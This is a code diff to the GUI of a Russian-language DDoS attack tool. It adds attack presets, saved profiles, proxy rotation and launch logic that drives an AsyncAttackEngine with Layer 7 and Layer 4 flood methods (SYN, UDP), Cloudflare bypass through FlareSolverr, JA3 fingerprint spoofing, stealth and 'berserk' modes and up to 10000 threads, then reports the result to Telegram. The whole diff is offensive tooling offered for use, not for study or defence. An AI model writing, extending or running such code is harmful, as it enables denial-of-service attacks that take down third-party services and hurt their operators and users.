@@ -32,7 +32,7 @@ class AttackTab(ttk.Frame):
         self.time_limit = 0
         self.time_start = 0
         self._build_ui()
-        self.app.logger.info("Вкладка Атаки v3.1 инициализирована")
+        self.app.logger.info("Вкладка Атаки v4.0 инициализирована")
         self.app.root.bind('<Control-Return>', lambda e: self._start_attack())
         self.app.root.bind('<Control-Key-Return>', lambda e: self._start_attack())
         # Drag-and-drop
@@ -95,7 +95,6 @@ class AttackTab(ttk.Frame):
         self.app.root.bind('<Control-l>', lambda e: self.log.delete(1.0, tk.END))
 
     def _on_drop(self, event):
-        # Drag-and-drop файла с целями
         try:
             file_path = self.app.root.tk.call('tk_getOpenFile')
             if file_path and file_path.endswith('.txt'):
@@ -206,4 +205,242 @@ class AttackTab(ttk.Frame):
         self.status_label = ttk.Label(ctrl_frame, text="Готов")
         self.status_label.grid(row=5, column=0, columnspan=3, sticky='w')
 
-    # Остальные методы (старт атаки, стоп, профили) остаются без изменений
+    # ---- Профили, пресеты, атака ----
+    def _apply_preset(self):
+        name = self.preset_var.get()
+        if name not in PRESETS: return
+        p = PRESETS[name]
+        self.method_var.set(p.get('method', 'CFBUAM'))
+        self.flare_url_var.set(p.get('flare', ''))
+        self.ja3_var.set(p.get('ja3', 'none'))
+        self.h2_var.set(p.get('h2', False))
+        self.storm_var.set(p.get('storm', False))
+        self.stealth_var.set(p.get('stealth', False))
+        self.adaptive_var.set(p.get('adaptive', True))
+        self.jitter_var.set(p.get('jitter', 0))
+        if p.get('threads_mult'):
+            self.threads_var.set(int(self.threads_var.get()) * p.get('threads_mult'))
+        self.proxy_mode_var.set('socks5' if p.get('socks5') else 'best')
+        if p.get('target_path'):
+            base = self.target_entry.get().strip().rstrip('/')
+            if base:
+                self.target_entry.delete(0, tk.END)
+                self.target_entry.insert(0, base + p['target_path'])
+        messagebox.showinfo("Пресет", f"Настройки '{name}' применены")
+
+    def _refresh_profiles(self):
+        profiles = load_profiles()
+        self.profile_combo['values'] = list(profiles.keys())
+
+    def _save_profile(self):
+        name = simpledialog.askstring("Профиль", "Имя профиля:")
+        if not name: return
+        config = {
+            'target': self.target_entry.get().strip(),
+            'method': self.method_var.get(),
+            'l4_method': self.l4_method_var.get(),
+            'port': self.port_var.get(),
+            'threads': self.threads_var.get(),
+            'power': self.power_var.get(),
+            'h2': self.h2_var.get(),
+            'storm': self.storm_var.get(),
+            'smart_flood': self.smart_flood_var.get(),
+            'berserk': self.berserk_var.get(),
+            'stealth': self.stealth_var.get(),
+            'adaptive': self.adaptive_var.get(),
+            'flare_url': self.flare_url_var.get(),
+            'ja3': self.ja3_var.get(),
+            'jitter': self.jitter_var.get(),
+            'l4_random_size': self.l4_random_size.get(),
+            'hybrid': self.hybrid_var.get(),
+            'proxy_mode': self.proxy_mode_var.get(),
+            'custom_proxies': self.custom_proxy_text.get("1.0", tk.END).strip()
+        }
+        save_profile(name, config)
+        self._refresh_profiles()
+        self.profile_var.set(name)
+
+    def _load_profile(self, event=None):
+        name = self.profile_var.get()
+        profiles = load_profiles()
+        if name not in profiles: return
+        config = profiles[name]
+        self.target_entry.delete(0, tk.END)
+        self.target_entry.insert(0, config.get('target', ''))
+        self.method_var.set(config.get('method', 'CFBUAM'))
+        self.l4_method_var.set(config.get('l4_method', 'UDP'))
+        self.port_var.set(config.get('port', 80))
+        self.threads_var.set(config.get('threads', 100))
+        self.power_var.set(config.get('power', False))
+        self.h2_var.set(config.get('h2', False))
+        self.storm_var.set(config.get('storm', False))
+        self.smart_flood_var.set(config.get('smart_flood', False))
+        self.berserk_var.set(config.get('berserk', False))
+        self.stealth_var.set(config.get('stealth', False))
+        self.adaptive_var.set(config.get('adaptive', True))
+        self.flare_url_var.set(config.get('flare_url', ''))
+        self.ja3_var.set(config.get('ja3', 'none'))
+        self.jitter_var.set(config.get('jitter', 0))
+        self.l4_random_size.set(config.get('l4_random_size', False))
+        self.hybrid_var.set(config.get('hybrid', False))
+        self.proxy_mode_var.set(config.get('proxy_mode', 'best'))
+        self.custom_proxy_text.delete("1.0", tk.END)
+        self.custom_proxy_text.insert("1.0", config.get('custom_proxies', ''))
+
+    def _delete_profile(self):
+        name = self.profile_var.get()
+        if not name: return
+        delete_profile(name)
+        self._refresh_profiles()
+        self.profile_var.set('')
+
+    def _load_targets_file(self):
+        f = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+        if f:
+            with open(f) as fh:
+                first_line = fh.readline().strip()
+                if first_line:
+                    self.target_entry.delete(0, tk.END)
+                    self.target_entry.insert(0, first_line)
+
+    def _start_attack(self):
+        if self.attack_active: return
+        target = self.target_entry.get().strip()
+        if not target:
+            messagebox.showerror("Ошибка", "Введите цель")
+            return
+        l7_method = self.method_var.get()
+        l4_method = self.l4_method_var.get()
+        if l7_method not in ("TCP", "UDP", "SYN_FLOOD"):
+            method = l7_method
+            port = None
+        else:
+            method = l4_method
+            port = self.port_var.get()
+
+        threads = self.threads_var.get()
+        if self.power_var.get(): threads = min(threads*2, 10000)
+        if self.stealth_var.get(): threads = 1
+
+        jitter = self.jitter_var.get()
+        flare_url = self.flare_url_var.get().strip() or None
+        ja3 = self.ja3_var.get()
+        ja3_profile = None if ja3 == "none" else ja3
+        random_ja3 = (ja3 == "random")
+        smart_flood = self.smart_flood_var.get()
+        berserk = self.berserk_var.get()
+        udp_random_size = self.l4_random_size.get()
+        hybrid = self.hybrid_var.get()
+
+        proxy_list = self._get_proxy_list()
+
+        self.engine = AsyncAttackEngine(
+            proxy_list, port=port, obfuscate=True, jitter=jitter,
+            flare_solverr_url=flare_url, ja3_profile=ja3_profile,
+            stealth=self.stealth_var.get(),
+            browser_storm=self.storm_var.get(),
+            use_h2=self.h2_var.get(),
+            adaptive=self.adaptive_var.get(),
+            random_ja3=random_ja3,
+            smart_flood=smart_flood,
+            berserk=berserk,
+            l4_method=l4_method,
+            udp_random_size=udp_random_size
+        )
+
+        self.attack_active = True
+        self._animate_start()
+        self.stop_btn.config(state=tk.NORMAL)
+        self.progress_var.set(0)
+        self.log.insert(tk.END, "[*] Атака начата\n", "info")
+        self.app.logger.info(f"Атака: {target} метод {method} потоков {threads}")
+        if hasattr(self.app, 'set_status'):
+            self.app.set_status("Атака", f"Цель: {target} | Метод: {method} | Потоков: {threads}")
+        self.time_limit = self.time_limit_var.get()
+        self.time_start = time.time()
+        threading.Thread(target=self._run_attack, args=(target, method, threads, hybrid, l4_method), daemon=True).start()
+
+    def _run_attack(self, target, method, threads, hybrid, l4_method):
+        start = time.time()
+        def progress(rps, total):
+            if hasattr(self.app, 'update_monitor'):
+                self.app.update_monitor(rps, total)
+            self._log_colored(f"RPS: {rps:.1f} | Запросов: {total}\n", "success")
+            if self.time_limit > 0 and time.time() - self.time_start > self.time_limit:
+                self.engine.stop()
+            if self.req_limit_var.get() > 0 and total >= self.req_limit_var.get():
+                self.engine.stop()
+            self.progress_var.set(min(100, (total % 1000) / 10))
+
+        try:
+            self.engine.launch(target, method, threads, progress_callback=progress, hybrid=hybrid, l4_method=l4_method)
+        except Exception as e:
+            self.app.logger.error(f"Ошибка в движке атаки: {e}")
+            self._log_colored(f"❌ Ошибка движка: {e}\n", "error")
+
+        end = time.time()
+        total_requests = self.engine.stats['count']
+        if hasattr(self.app, 'save_attack_history'):
+            self.app.save_attack_history(target, method, threads, start, end, total_requests)
+        self.attack_active = False
+        self.after(0, self._attack_finished)
+        self._log_colored(f"[✓] Атака завершена за {end-start:.1f}с, запросов: {total_requests}\n", "info")
+        self._notify_telegram(target, method, threads, end-start, total_requests)
+        if hasattr(self.app, 'show_toast'):
+            self.app.show_toast(f"Атака завершена: {total_requests} запросов за {end-start:.1f}с")
+
+    def _stop_attack(self):
+        if self.engine:
+            self.engine.stop()
+        self.attack_active = False
+        self.app.logger.warning("Атака остановлена пользователем")
+        self._attack_finished()
+
+    def _get_proxy_list(self):
+        mode = self.proxy_mode_var.get()
+        if mode == "custom":
+            custom = self.custom_proxy_text.get("1.0", tk.END).strip()
+            if custom:
+                return [line.strip() for line in custom.splitlines() if line.strip()]
+        if self.proxy_mgr and hasattr(self.proxy_mgr, 'proxies'):
+            if mode == "best":
+                return self.proxy_mgr.get_best_proxies(50)
+            elif mode == "all":
+                return [f"{p['ip']}:{p['port']}" for p in self.proxy_mgr.proxies]
+            elif mode == "http":
+                return self.proxy_mgr.get_best_proxies(50, proxy_type='http')
+            elif mode == "socks5":
+                return self.proxy_mgr.get_best_proxies(50, proxy_type='socks5')
+        return []
+
+    def _notify_telegram(self, target, method, threads, duration, total_requests):
+        token = getattr(self.app, 'settings', {}).get('telegram_token', '')
+        chat_id = getattr(self.app, 'settings', {}).get('telegram_chat_id', '')
+        if not token or not chat_id: return
+        try:
+            msg = f"✅ Атака завершена\nЦель: {target}\nМетод: {method}\nПотоков: {threads}\nДлительность: {duration:.1f}с\nЗапросов: {total_requests}"
+            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
+                          json={"chat_id": chat_id, "text": msg}, timeout=5)
+        except: pass
+
+    def _animate_start(self):
+        self._animating = True
+        self._animate_button(0)
+
+    def _animate_button(self, count):
+        if not self._animating or not self.attack_active: return
+        self.attack_btn.config(text="⚡ АТАКА..." if count % 2 == 0 else "⚡⚡ АТАКА...")
+        self.after(500, self._animate_button, count + 1)
+
+    def _attack_finished(self):
+        self._animating = False
+        self.attack_btn.config(text="🚀 ЗАПУСТИТЬ")
+        self.stop_btn.config(state=tk.DISABLED)
+        self.progress_var.set(0)
+        self.status_label.config(text="Готов")
+        if hasattr(self.app, 'set_status'):
+            self.app.set_status("Готов")
+
+    def _log_colored(self, msg, tag):
+        self.log.insert(tk.END, msg, tag)
+        self.log.see(tk.END)
